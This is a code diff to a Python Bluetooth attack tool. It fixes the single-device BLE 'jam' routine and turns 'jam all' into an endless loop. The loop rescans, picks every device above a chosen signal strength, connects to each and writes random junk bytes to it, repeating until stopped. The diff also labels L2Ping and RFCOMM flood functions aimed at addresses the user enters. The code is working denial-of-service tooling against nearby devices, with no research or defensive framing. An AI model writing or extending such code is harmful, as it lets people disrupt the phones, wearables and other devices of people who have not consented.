@@ -1,4 +1,3 @@
-# [Imports and banner unchanged]
 import os
 import sys
 import time
@@ -82,7 +81,7 @@ def spam_all_ble():
         except Exception as e:
             print(f"⚠️ Could not spam {device.addr}: {e}")
 
-# 🚫 Jam Single BLE Device (Enhanced)
+# 🚫 Jam Single BLE Device (Enhanced, FIXED)
 def jam_ble():
     print("🔎 Resetting BLE scan before jamming...")
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -94,20 +93,21 @@ def jam_ble():
         scanner = Scanner()
         try:
             devices = scanner.scan(10.0)
+            device_list = list(devices)  # ✅ FIXED
         except BTLEException as e:
             print(f"⚠️ BLE Scan Failed: {e}")
             continue
 
-        if not devices:
+        if not device_list:
             print("⚠️ No devices found!")
             continue
 
-        for idx, device in enumerate(devices):
+        for idx, device in enumerate(device_list):
             print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
 
         try:
             idx = int(input("💜 Enter index of device to jam: "))
-            target = devices[idx].addr
+            target = device_list[idx].addr  # ✅ FIXED
         except (ValueError, IndexError):
             print("⚠️ Invalid choice.")
             continue
@@ -126,35 +126,49 @@ def jam_ble():
             if retry != 'y':
                 break
 
-# 🚫 Jam All BLE Devices
+# 🚫 Jam All BLE Devices — AUTO RE-SCAN + RSSI FILTER EDITION
 def jam_all_ble():
-    print("🔎 Scanning for BLE devices to jam 📡")
-    scanner = Scanner()
+    print("🔎 Starting auto-rejam loop 📡")
     try:
-        devices = scanner.scan(10.0)
-    except BTLEException as e:
-        print(f"⚠️ Scan failed: {e}")
-        return
+        min_rssi = int(input("💜 Enter minimum RSSI to jam (e.g. -80): "))
+    except ValueError:
+        min_rssi = -80
+        print("⚠️ Invalid input! Defaulting to -80 dB.")
 
-    if not devices:
-        print("⚠️ No BLE devices found.")
-        return
-
-    print(f"🚫 Starting multi-device jammer...")
     try:
         while True:
-            for device in devices:
+            print("\n🔁 Scanning for BLE devices to jam...")
+            scanner = Scanner()
+            try:
+                devices = scanner.scan(10.0)
+            except BTLEException as e:
+                print(f"⚠️ Scan failed: {e}")
+                continue
+
+            jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]
+
+            if not jam_targets:
+                print("⚠️ No targets found above threshold. Retrying...")
+                time.sleep(5)
+                continue
+
+            for device in jam_targets:
                 try:
+                    print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
                     peripheral = Peripheral(device.addr)
                     junk = os.urandom(random.randint(20, 50))
                     peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
-                    print(f"💥 Jammed {device.addr}")
                     peripheral.disconnect()
                     time.sleep(random.uniform(0.05, 0.2))
                 except Exception as e:
                     print(f"⚠️ Skipped {device.addr}: {e}")
+
+            print("🔁 Waiting 5 seconds before next scan...")
+            time.sleep(5)
+
     except KeyboardInterrupt:
-        print("🛑 Jam All stopped.")
+        print("\n🛑 Auto re-jam stopped by user.")
+
 
 # 🔎 Bluetooth Scanner
 def scan_bluetooth():
@@ -171,9 +185,7 @@ def scan_bluetooth():
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
 
-# Other unchanged functions (l2ping_attack, rfcomm_flood, start_bluetooth)
-# ✂️ [same as before]
-
+# 💥 L2Ping Flood
 def l2ping_attack():
     while True:
         addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
@@ -190,6 +202,7 @@ def l2ping_attack():
             if input("💜 Try another? (y/n): ").strip().lower() != 'y':
                 break
 
+# ✅ RFCOMM Flood
 def rfcomm_flood():
     addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
     if not addr:
@@ -203,6 +216,7 @@ def rfcomm_flood():
         except subprocess.CalledProcessError:
             print(f"⚠️ Attempt {i+1}: Failed")
 
+# 🧠 Start Bluetooth Service
 def start_bluetooth():
     print("📡 Starting Bluetooth service...")
     subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
